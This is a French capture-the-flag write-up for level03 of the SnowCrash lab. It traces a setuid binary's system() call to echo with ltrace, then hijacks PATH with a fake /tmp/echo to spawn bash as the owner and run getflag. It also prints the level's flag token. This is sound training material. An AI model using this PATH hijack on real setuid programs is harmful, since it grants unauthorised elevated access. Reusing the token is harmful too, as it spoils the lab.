On trouve dans le dossier **home** un binaire **level03** qui, lorsqu'on le lance, nous affiche un message:
<pre><code>> ./level03
Exploit me</code></pre>

On cherche à savoir ce que le binaire fait, pour cela on utilise **ltrace**:
<pre><code>> ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580
getegid()											= 2003
geteuid()											= 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
--- SIGCHLD (Child exited) ---
<... system resumed> )
</code></pre>
On observe que le binaire fait un appel **system** pour faire un **echo**

Du coup nous essayons de changer cet appel pour avoir accès à un shell avec les permissions de l'owner:

<pre><code>> echo "/bin/bash" > /tmp/echo
> chmod 777 /tmp/echo && export PATH=/tmp:$PATH
</code></pre>
> Nous remplaçons le **/bin/echo** par un **/bin/bash** pour lancer une nouvelle instance de bash avec des droits plus élevés (ceux de l'owner).


On relance notre binaire:
<pre><code>> ./level03</code></pre>

Notre user passe de <code>level03@SnowCrash</code> à <code>flag03@SnowCrash</code>

Donc notre user a bien changé.

<pre>
<code>> getflag</code>
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
</pre>
> La commande **getflag** est la seule commande que nous pouvons faire, bien évidemment, sinon il nous serait possible de faire ce que l'on veut sur l'ISO.


## Alternative

<pre><code>> echo "/bin/getflag" > /tmp/echo
> chmod 777 /tmp/echo && export PATH=/tmp:$PATH
</code></pre>

On relance notre binaire:
<pre><code>> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
</code></pre>